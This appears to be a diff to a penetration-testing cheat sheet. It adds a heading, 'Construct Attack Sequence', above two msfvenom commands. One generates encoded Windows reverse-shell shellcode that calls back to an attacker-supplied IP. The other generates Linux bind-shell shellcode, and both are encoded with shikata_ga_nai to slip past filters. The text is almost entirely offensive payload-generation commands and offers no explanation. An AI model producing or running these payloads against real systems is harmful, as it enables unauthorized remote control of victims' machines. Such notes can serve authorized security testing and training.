@@ -1,3 +1,5 @@
+## Construct Attack Sequence
+
 msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai generate shellcode
 
 msfvenom -p linux/x86/shell_bind_tcp LPORT=443 -f c -a x86 --platform linux -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai generate shellcode
